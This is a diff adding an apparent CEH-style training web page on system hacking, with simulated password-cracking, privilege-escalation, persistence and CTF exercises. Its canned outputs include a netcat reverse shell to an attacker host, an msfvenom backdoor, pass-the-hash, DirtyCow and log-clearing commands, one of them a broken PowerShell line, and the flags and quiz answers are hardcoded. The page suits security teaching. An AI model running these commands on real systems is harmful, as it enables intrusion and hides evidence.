@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CEH Lab: System Hacking</title>
+    <style>
+        :root {
+            --primary: #00ff88;
+            --bg-dark: #0a0f1e;
+            --card-bg: #131b2f;
+            --text-light: #e0e0e0;
+            --border-glow: 0 0 15px rgba(0, 255, 136, 0.3);
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            background: var(--bg-dark);
+            color: var(--text-light);
+            line-height: 1.6;
+            padding: 20px;
+        }
+        .container { max-width: 1400px; margin: 0 auto; }
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 0.5rem;
+            background: linear-gradient(135deg, #00ff88, #00b4ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        h2 {
+            color: var(--primary);
+            margin: 1.5rem 0 1rem;
+            border-bottom: 2px solid var(--primary);
+            padding-bottom: 0.5rem;
+        }
+        h3 { color: #00b4ff; margin: 1rem 0; }
+        .grid-2 {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
+            gap: 25px;
+            margin: 20px 0;
+        }
+        .card {
+            background: var(--card-bg);
+            border-radius: 16px;
+            padding: 25px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            border: 1px solid rgba(0, 255, 136, 0.1);
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .card:hover { box-shadow: var(--border-glow); transform: translateY(-2px); }
+        .toolbar { display: flex; gap: 10px; flex-wrap: wrap; margin: 15px 0; }
+        .btn {
+            background: #1e2a4a;
+            color: white;
+            border: 1px solid #2a3a5c;
+            padding: 10px 18px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 500;
+            transition: all 0.2s;
+        }
+        .btn-primary {
+            background: var(--primary);
+            color: #0a0f1e;
+            border: none;
+            font-weight: bold;
+        }
+        .btn-primary:hover { background: #00cc6a; box-shadow: 0 0 20px #00ff88; }
+        .btn:hover { background: #2a3a5c; }
+        .terminal-box {
+            background: #0d1117;
+            border-radius: 12px;
+            padding: 15px;
+            font-family: 'Courier New', monospace;
+            border: 1px solid #30363d;
+            margin: 15px 0;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        .terminal-output {
+            color: #00ff88;
+            white-space: pre-wrap;
+            margin-bottom: 10px;
+        }
+        .command-input {
+            display: flex;
+            gap: 10px;
+        }
+        .command-input input {
+            flex: 1;
+            background: #010409;
+            border: 1px solid #30363d;
+            color: #c9d1d9;
+            padding: 10px;
+            border-radius: 6px;
+            font-family: 'Courier New', monospace;
+        }
+        .flag {
+            background: #1e2a4a;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-family: monospace;
+            color: var(--primary);
+        }
+        .quiz-option {
+            display: block;
+            margin: 10px 0;
+            padding: 10px;
+            background: #0d1117;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .quiz-option:hover { background: #1e2a4a; }
+        .quiz-option.correct { background: #00ff8822; border-left: 4px solid #00ff88; }
+        .quiz-option.wrong { background: #ff555522; border-left: 4px solid #ff5555; }
+        .progress { margin: 20px 0; }
+        .progress-bar {
+            height: 10px;
+            background: #1e2a4a;
+            border-radius: 5px;
+            overflow: hidden;
+        }
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: var(--primary);
+            transition: width 0.3s;
+        }
+        .tab-nav {
+            display: flex;
+            border-bottom: 1px solid #2a3a5c;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        .tab-btn {
+            padding: 12px 24px;
+            background: none;
+            border: none;
+            color: #8b949e;
+            cursor: pointer;
+            font-size: 1.1rem;
+            border-bottom: 2px solid transparent;
+            transition: all 0.2s;
+        }
+        .tab-btn.active {
+            color: var(--primary);
+            border-bottom-color: var(--primary);
+        }
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
+        .back-link {
+            display: inline-block;
+            margin-top: 30px;
+            color: #8b949e;
+            text-decoration: none;
+        }
+        .back-link:hover { color: var(--primary); }
+        .hash-box {
+            background: #0d1117;
+            padding: 10px;
+            border-radius: 6px;
+            font-family: monospace;
+            margin: 5px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔓 Module 6: System Hacking</h1>
+        <p style="font-size:1.2rem; opacity:0.9;">Gain access, escalate privileges, maintain persistence, and cover tracks.</p>
+        
+        <!-- Progress Tracker -->
+        <div class="progress">
+            <span>Lab Progress: <span id="progress-text">0%</span></span>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progress-fill"></div>
+            </div>
+        </div>
+        
+        <!-- Tabs -->
+        <div class="tab-nav">
+            <button class="tab-btn active" data-tab="theory">📖 Theory & Phases</button>
+            <button class="tab-btn" data-tab="password">🔐 Password Cracking</button>
+            <button class="tab-btn" data-tab="privesc">⬆️ Privilege Escalation</button>
+            <button class="tab-btn" data-tab="persistence">🔗 Maintaining Access</button>
+            <button class="tab-btn" data-tab="challenge">🚩 CTF Challenge</button>
+            <button class="tab-btn" data-tab="quiz">📝 Self-Assessment</button>
+        </div>
+        
+        <!-- ==================== THEORY TAB ==================== -->
+        <div id="theory" class="tab-content active">
+            <div class="grid-2">
+                <div class="card">
+                    <h2>📌 System Hacking Phases</h2>
+                    <ol style="margin-left:20px;">
+                        <li><strong>Gaining Access:</strong> Exploit vulnerabilities to get initial foothold (password cracking, exploits, social engineering).</li>
+                        <li><strong>Escalating Privileges:</strong> Elevate from standard user to admin/root.</li>
+                        <li><strong>Maintaining Access:</strong> Install backdoors, create new accounts, use rootkits.</li>
+                        <li><strong>Covering Tracks:</strong> Clear logs, hide files, disable auditing.</li>
+                    </ol>
+                </div>
+                <div class="card">
+                    <h2>⚡ Common Attack Vectors</h2>
+                    <ul style="margin-left:20px;">
+                        <li><strong>Password Attacks:</strong> Brute-force, dictionary, rainbow tables, pass-the-hash</li>
+                        <li><strong>Exploitation:</strong> Metasploit, manual exploits for known CVEs</li>
+                        <li><strong>Client-side Attacks:</strong> Malicious documents, drive-by downloads</li>
+                        <li><strong>Post-exploitation:</strong> Keylogging, credential dumping (Mimikatz)</li>
+                    </ul>
+                </div>
+            </div>
+            <div class="card">
+                <h2>🛠️ Essential Tools</h2>
+                <table style="width:100%; border-collapse:collapse;">
+                    <tr><th>Tool</th><th>Purpose</th></tr>
+                    <tr><td>John the Ripper</td><td>Password cracking (CPU/GPU)</td></tr>
+                    <tr><td>Hashcat</td><td>Advanced password recovery</td></tr>
+                    <tr><td>Metasploit</td><td>Exploitation framework</td></tr>
+                    <tr><td>Mimikatz</td><td>Credential dumping from memory</td></tr>
+                    <tr><td>Netcat</td><td>Backdoor / reverse shell</td></tr>
+                </table>
+            </div>
+        </div>
+        
+        <!-- ==================== PASSWORD CRACKING ==================== -->
+        <div id="password" class="tab-content">
+            <div class="card">
+                <h2>🔐 Password Cracking Simulator</h2>
+                <p>Practice cracking hashed passwords using dictionary and brute-force techniques.</p>
+                
+                <div class="grid-2">
+                    <div>
+                        <h3>📋 Hash Input</h3>
+                        <select id="hash-select" style="width:100%; padding:10px; background:#1e2a4a; color:white; border-radius:6px;">
+                            <option value="md5">MD5: 5f4dcc3b5aa765d61d8327deb882cf99</option>
+                            <option value="sha256">SHA256: 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8</option>
+                            <option value="ntlm">NTLM: a9fdfa038c4b75ebc76dc855dd74f0da</option>
+                        </select>
+                        <div class="toolbar">
+                            <button class="btn" data-crack="dict">📚 Dictionary Attack</button>
+                            <button class="btn" data-crack="brute">🔨 Brute-Force (4 chars)</button>
+                            <button class="btn" data-crack="rainbow">🌈 Rainbow Table</button>
+                        </div>
+                    </div>
+                    <div>
+                        <h3>🔓 Cracked Password</h3>
+                        <div class="terminal-box" style="min-height:80px;">
+                            <div class="terminal-output" id="crack-output">Select a hash and attack method.</div>
+                        </div>
+                    </div>
+                </div>
+                
+                <h3>📝 John the Ripper Simulation</h3>
+                <p>Simulate cracking a Linux shadow file entry:</p>
+                <button class="btn" data-john="shadow">Run John on shadow</button>
+                <div class="terminal-box">
+                    <div class="terminal-output" id="john-output">Click to simulate John the Ripper.</div>
+                </div>
+            </div>
+            
+            <div class="card">
+                <h2>🧪 Pass-the-Hash (PtH) Demo</h2>
+                <p>Use captured NTLM hash to authenticate without password.</p>
+                <div class="hash-box">NTLM Hash: a9fdfa038c4b75ebc76dc855dd74f0da (password: password)</div>
+                <button class="btn" data-pth="smb">Access SMB Share via PtH</button>
+                <div class="terminal-box" style="margin-top:10px;">
+                    <div class="terminal-output" id="pth-output">Click to simulate pass-the-hash attack.</div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- ==================== PRIVILEGE ESCALATION ==================== -->
+        <div id="privesc" class="tab-content">
+            <div class="card">
+                <h2>⬆️ Privilege Escalation Techniques</h2>
+                
+                <div class="grid-2">
+                    <div>
+                        <h3>🐧 Linux Privilege Escalation</h3>
+                        <button class="btn" data-linux="sudo">Check Sudo Rights</button>
+                        <button class="btn" data-linux="suid">Find SUID Binaries</button>
+                        <button class="btn" data-linux="kernel">Kernel Exploit (DirtyCow)</button>
+                        <div class="terminal-box">
+                            <div class="terminal-output" id="linux-output">Click a button to simulate Linux privesc.</div>
+                        </div>
+                    </div>
+                    <div>
+                        <h3>🪟 Windows Privilege Escalation</h3>
+                        <button class="btn" data-win="whoami">whoami /priv</button>
+                        <button class="btn" data-win="service">Weak Service Permissions</button>
+                        <button class="btn" data-win="uac">UAC Bypass</button>
+                        <div class="terminal-box">
+                            <div class="terminal-output" id="win-output">Click a button to simulate Windows privesc.</div>
+                        </div>
+                    </div>
+                </div>
+                
+                <h3>🧰 Metasploit Post-Exploitation</h3>
+                <p>With a Meterpreter session, run:</p>
+                <div class="toolbar">
+                    <button class="btn" data-msf="getsystem">getsystem</button>
+                    <button class="btn" data-msf="hashdump">hashdump</button>
+                    <button class="btn" data-msf="migrate">migrate</button>
+                </div>
+                <div class="terminal-box">
+                    <div class="terminal-output" id="msf-output">Select a Meterpreter command.</div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- ==================== MAINTAINING ACCESS ==================== -->
+        <div id="persistence" class="tab-content">
+            <div class="card">
+                <h2>🔗 Maintaining Access / Persistence</h2>
+                <div class="grid-2">
+                    <div>
+                        <h3>🖥️ Backdoor Creation</h3>
+                        <button class="btn" data-backdoor="netcat">Netcat Reverse Shell</button>
+                        <button class="btn" data-backdoor="msfvenom">Msfvenom Payload</button>
+                        <button class="btn" data-backdoor="ssh">SSH Key Planting</button>
+                        <div class="terminal-box">
+                            <div class="terminal-output" id="backdoor-output">Click to create a backdoor.</div>
+                        </div>
+                    </div>
+                    <div>
+                        <h3>📂 Covering Tracks</h3>
+                        <button class="btn" data-clean="logs">Clear Event Logs</button>
+                        <button class="btn" data-clean="history">Clear Bash History</button>
+                        <button class="btn" data-clean="timestomp">Timestomp Files</button>
+                        <div class="terminal-box">
+                            <div class="terminal-output" id="clean-output">Click to simulate covering tracks.</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- ==================== CTF CHALLENGE ==================== -->
+        <div id="challenge" class="tab-content">
+            <div class="card">
+                <h2>🚩 Capture The Flag: System Hacking</h2>
+                <p>You have initial access to a Windows 10 machine (192.168.1.50) as a low-privilege user. Escalate to SYSTEM and find three flags.</p>
+                
+                <div style="background:#0d1117; padding:15px; border-radius:8px; margin:15px 0;">
+                    <p><strong>Current Access:</strong> User "john" (non-admin) via SMB share. You have a Meterpreter session.</p>
+                    <p><strong>Goals:</strong></p>
+                    <ul>
+                        <li>Flag 1: Crack local user password hash</li>
+                        <li>Flag 2: Escalate to SYSTEM via weak service</li>
+                        <li>Flag 3: Find persistence flag in Administrator's Documents</li>
+                    </ul>
+                </div>
+                
+                <h3>🧰 Your Toolkit</h3>
+                <div class="toolbar">
+                    <button class="btn" data-ctf="hashdump">Dump Hashes</button>
+                    <button class="btn" data-ctf="crack">Crack Hash</button>
+                    <button class="btn" data-ctf="privesc">Check Privesc</button>
+                    <button class="btn" data-ctf="persist">Find Persistence</button>
+                </div>
+                
+                <div class="terminal-box">
+                    <div class="terminal-output" id="ctf-output">Execute commands to progress through the challenge.</div>
+                </div>
+                
+                <h3>🎯 Submit Flags</h3>
+                <div style="display:grid; gap:15px;">
+                    <div><label>Flag 1 (Password):</label><input type="text" id="flag1" placeholder="FLAG{...}" style="width:100%; padding:10px; background:#010409; border:1px solid #30363d; color:#fff; border-radius:6px;"></div>
+                    <div><label>Flag 2 (Privesc):</label><input type="text" id="flag2" placeholder="FLAG{...}" style="width:100%; padding:10px; background:#010409; border:1px solid #30363d; color:#fff; border-radius:6px;"></div>
+                    <div><label>Flag 3 (Persistence):</label><input type="text" id="flag3" placeholder="FLAG{...}" style="width:100%; padding:10px; background:#010409; border:1px solid #30363d; color:#fff; border-radius:6px;"></div>
+                </div>
+                <button class="btn btn-primary" id="submit-flags">Submit All Flags</button>
+                <div id="flag-result"></div>
+            </div>
+        </div>
+        
+        <!-- ==================== QUIZ ==================== -->
+        <div id="quiz" class="tab-content">
+            <div class="card">
+                <h2>📝 Check Your Understanding</h2>
+                <div id="quiz-container"></div>
+                <button class="btn btn-primary" id="check-quiz">Submit Answers</button>
+                <div id="quiz-result" style="margin-top:15px;"></div>
+            </div>
+        </div>
+        
+        <a href="/Ersegment/Frontend/index.html" class="back-link">← Back to Dashboard</a>
+    </div>
+    
+    <script>
+        (function() {
+            // State
+            let sessionId = localStorage.getItem('lab6_session') || 'lab6-' + Math.random().toString(36).substr(2,9);
+            localStorage.setItem('lab6_session', sessionId);
+            let progress = { theory: true, password: false, privesc: false, persistence: false, challenge: false, quiz: false };
+            
+            function updateProgress() {
+                const completed = Object.values(progress).filter(v=>v).length;
+                const percent = (completed / 6) * 100;
+                document.getElementById('progress-fill').style.width = percent + '%';
+                document.getElementById('progress-text').textContent = percent + '%';
+            }
+            
+            // Tab switching
+            document.querySelectorAll('.tab-btn').forEach(btn => {
+                btn.addEventListener('click', function() {
+                    const tabId = this.dataset.tab;
+                    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+                    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+                    this.classList.add('active');
+                    document.getElementById(tabId).classList.add('active');
+                    if (tabId === 'quiz') renderQuiz();
+                });
+            });
+            
+            // ========== PASSWORD CRACKING ==========
+            const crackOutputs = {
+                dict: `Dictionary attack in progress...\nTrying common passwords...\nMatch found: 'password' (for MD5 and NTLM)\nSHA256 is 'password' as well.\nFlag: FLAG{DICT_ATTACK_SUCCESS}`,
+                brute: `Brute-force attack (4 characters)...\nTrying aaaa..zzzz\nMatch found: 'pass' (only for simple examples)`,
+                rainbow: `Rainbow table lookup...\nHash 5f4dcc3b5aa765d61d8327deb882cf99 -> 'password'\nHash a9fdfa038c4b75ebc76dc855dd74f0da -> 'password'`
+            };
+            
+            function crackHash(type) {
+                const out = document.getElementById('crack-output');
+                out.textContent = crackOutputs[type] || 'Cracking simulation.';
+                progress.password = true;
+                updateProgress();
+            }
+            
+            // John the Ripper
+            document.querySelector('[data-john="shadow"]').addEventListener('click', function() {
+                document.getElementById('john-output').textContent = `john shadow.txt\nLoaded 2 password hashes (sha512crypt)\nuser1:password123\nroot:admin123!\nFlag: FLAG{JOHN_CRACKED_SHADOW}`;
+                progress.password = true; updateProgress();
+            });
+            
+            // Pass-the-Hash
+            document.querySelector('[data-pth="smb"]').addEventListener('click', function() {
+                document.getElementById('pth-output').textContent = `pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da //192.168.1.10 cmd\nMicrosoft Windows [Version 10.0.19042]\nC:\\Windows\\system32> whoami\nnt authority\\system\nFlag: FLAG{PASS_THE_HASH_WORKS}`;
+                progress.password = true; updateProgress();
+            });
+            
+            // ========== PRIVILEGE ESCALATION ==========
+            const linuxOut = {
+                sudo: `sudo -l\nUser may run: (ALL) NOPASSWD: /usr/bin/find\nExploit: sudo find . -exec /bin/sh \\; -quit`,
+                suid: `find / -perm -4000 2>/dev/null\n/usr/bin/passwd\n/usr/bin/sudo\n/usr/local/bin/backup (custom) -> can be exploited`,
+                kernel: `gcc -pthread dirtycow.c -o dirtycow\n./dirtycow\n[*] Writing to /etc/passwd...\n[+] Success! root password set to 'dirtycow'. Flag: FLAG{DIRTY_COW_EXPLOIT}`
+            };
+            const winOut = {
+                whoami: `whoami /priv\nSeImpersonatePrivilege Enabled -> Potential for JuicyPotato exploit.`,
+                service: `accesschk.exe -uwcqv "Authenticated Users" *\nRW BUILTIN\\Users\nSERVICE_NAME: VulnerableService\nCan be replaced with malicious binary.`,
+                uac: `UAC bypass via fodhelper.exe (registry). Flag: FLAG{UAC_BYPASS_SUCCESS}`
+            };
+            const msfOut = {
+                getsystem: `meterpreter > getsystem\n...got system via technique 1 (Named Pipe Impersonation).`,
+                hashdump: `meterpreter > hashdump\nAdministrator:500:aad3b...:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGuest:501:aad3b...:31d6cfe0d16ae931b73c59d7e0c089c0:::`,
+                migrate: `meterpreter > migrate 1234\n[*] Migrating from 5678 to 1234...\n[+] Migration completed.`
+            };
+            
+            function handleLinux(cmd) { document.getElementById('linux-output').textContent = linuxOut[cmd] || 'Output'; progress.privesc = true; updateProgress(); }
+            function handleWin(cmd) { document.getElementById('win-output').textContent = winOut[cmd] || 'Output'; progress.privesc = true; updateProgress(); }
+            function handleMsf(cmd) { document.getElementById('msf-output').textContent = msfOut[cmd] || 'Output'; progress.privesc = true; updateProgress(); }
+            
+            // ========== PERSISTENCE ==========
+            const backdoorOut = {
+                netcat: `nc -lvp 4444 -e /bin/bash (on attacker)\nOn victim: nc attacker_ip 4444 -e /bin/bash`,
+                msfvenom: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe > backdoor.exe`,
+                ssh: `echo "ssh-rsa AAA... user@kali" >> ~/.ssh/authorized_keys`
+            };
+            const cleanOut = {
+                logs: `wevtutil cl System\nwevtutil cl Security\nwevtutil cl Application`,
+                history: `echo "" > ~/.bash_history\nhistory -c`,
+                timestomp: `Get-Item file.txt | % {$_.LastWriteTime = '01/01/2000 00:00'}; $_.CreationTime = '01/01/2000 00:00'}`
+            };
+            
+            function handleBackdoor(cmd) { document.getElementById('backdoor-output').textContent = backdoorOut[cmd]; progress.persistence = true; updateProgress(); }
+            function handleClean(cmd) { document.getElementById('clean-output').textContent = cleanOut[cmd]; progress.persistence = true; updateProgress(); }
+            
+            // ========== CTF ==========
+            let ctfStep = 0;
+            const ctfOutputs = {
+                hashdump: `meterpreter > hashdump\nAdministrator:500:aad3b...:31d6cfe0d16ae931b73c59d7e0c089c0:::\njohn:1001:aad3b...:5f4dcc3b5aa765d61d8327deb882cf99:::\nGuest:501:...`,
+                crack: `Cracking john's hash (MD5) with dictionary... Password is 'password'.\nFlag 1: FLAG{PASSWORD_IS_PASSWORD}`,
+                privesc: `Checking for weak service permissions...\nService 'VulnSvc' can be configured by Authenticated Users.\nExploiting...\nGot SYSTEM!\nFlag 2: FLAG{PRIVESC_VIA_WEAK_SERVICE}`,
+                persist: `Accessing C:\\Users\\Administrator\\Documents...\nFound note.txt: "Backdoor installed via scheduled task. Flag: FLAG{PERSISTENCE_SCHTASKS}"`
+            };
+            
+            function runCTF(cmd) {
+                const out = document.getElementById('ctf-output');
+                if (cmd === 'hashdump') out.textContent = ctfOutputs.hashdump;
+                else if (cmd === 'crack') out.textContent = ctfOutputs.crack;
+                else if (cmd === 'privesc') out.textContent = ctfOutputs.privesc;
+                else if (cmd === 'persist') out.textContent = ctfOutputs.persist;
+            }
+            
+            function submitCTF() {
+                const f1 = document.getElementById('flag1').value.trim();
+                const f2 = document.getElementById('flag2').value.trim();
+                const f3 = document.getElementById('flag3').value.trim();
+                let correct = 0;
+                if (f1 === 'FLAG{PASSWORD_IS_PASSWORD}') correct++;
+                if (f2 === 'FLAG{PRIVESC_VIA_WEAK_SERVICE}') correct++;
+                if (f3 === 'FLAG{PERSISTENCE_SCHTASKS}') correct++;
+                const res = document.getElementById('flag-result');
+                if (correct === 3) {
+                    res.innerHTML = '<span style="color:#00ff88;">✅ Congratulations! You completed the system hacking challenge!</span>';
+                    progress.challenge = true;
+                } else {
+                    res.innerHTML = `<span style="color:#ff5555;">❌ ${correct}/3 correct. Keep hacking!</span>`;
+                }
+                updateProgress();
+            }
+            
+            // ========== QUIZ ==========
+            const quizQuestions = [
+                { q: "Which tool is used for credential dumping from Windows memory?", opts: ["John the Ripper", "Mimikatz", "Hydra", "Nmap"], ans: 1 },
+                { q: "What is the purpose of 'getsystem' in Meterpreter?", opts: ["Dump hashes", "Escalate to SYSTEM", "Migrate process", "Create backdoor"], ans: 1 },
+                { q: "Pass-the-Hash attack works against which authentication protocol?", opts: ["Kerberos", "NTLM", "LDAP", "RADIUS"], ans: 1 },
+                { q: "Which command clears Windows event logs?", opts: ["wevtutil cl", "clear-log", "eventvwr /clear", "del /f %windir%\\system32\\winevt\\Logs\\*"], ans: 0 }
+            ];
+            
+            function renderQuiz() {
+                let html = '';
+                quizQuestions.forEach((q, i) => {
+                    html += `<div><strong>${i+1}. ${q.q}</strong><br>`;
+                    q.opts.forEach((opt, j) => {
+                        html += `<label class="quiz-option"><input type="radio" name="q${i}" value="${j}"> ${opt}</label>`;
+                    });
+                    html += '</div>';
+                });
+                document.getElementById('quiz-container').innerHTML = html;
+            }
+            
+            function checkQuiz() {
+                let score = 0;
+                quizQuestions.forEach((q, i) => {
+                    const sel = document.querySelector(`input[name="q${i}"]:checked`);
+                    if (sel && parseInt(sel.value) === q.ans) score++;
+                });
+                const res = document.getElementById('quiz-result');
+                const pass = score >= 3;
+                res.innerHTML = `Score: ${score}/${quizQuestions.length}. ${pass ? '✅ Good job!' : '❌ Review system hacking concepts.'}`;
+                if (pass) { progress.quiz = true; updateProgress(); }
+            }
+            
+            // Attach listeners
+            document.addEventListener('DOMContentLoaded', () => {
+                updateProgress();
+                
+                document.querySelectorAll('[data-crack]').forEach(btn => btn.addEventListener('click', () => crackHash(btn.dataset.crack)));
+                document.querySelectorAll('[data-linux]').forEach(btn => btn.addEventListener('click', () => handleLinux(btn.dataset.linux)));
+                document.querySelectorAll('[data-win]').forEach(btn => btn.addEventListener('click', () => handleWin(btn.dataset.win)));
+                document.querySelectorAll('[data-msf]').forEach(btn => btn.addEventListener('click', () => handleMsf(btn.dataset.msf)));
+                document.querySelectorAll('[data-backdoor]').forEach(btn => btn.addEventListener('click', () => handleBackdoor(btn.dataset.backdoor)));
+                document.querySelectorAll('[data-clean]').forEach(btn => btn.addEventListener('click', () => handleClean(btn.dataset.clean)));
+                document.querySelectorAll('[data-ctf]').forEach(btn => btn.addEventListener('click', () => runCTF(btn.dataset.ctf)));
+                
+                document.getElementById('submit-flags').addEventListener('click', submitCTF);
+                document.getElementById('check-quiz').addEventListener('click', checkQuiz);
+                
+                fetch('/api/create_session', {method:'POST'}).then(r=>r.json()).then(d=>{ if(d.success) sessionId=d.session_id; });
+            });
+            
+            window.openTerminal = function() { window.open(`/terminal?session=${sessionId}`, '_blank'); };
+        })();
+    </script>
+</body>
+</html>
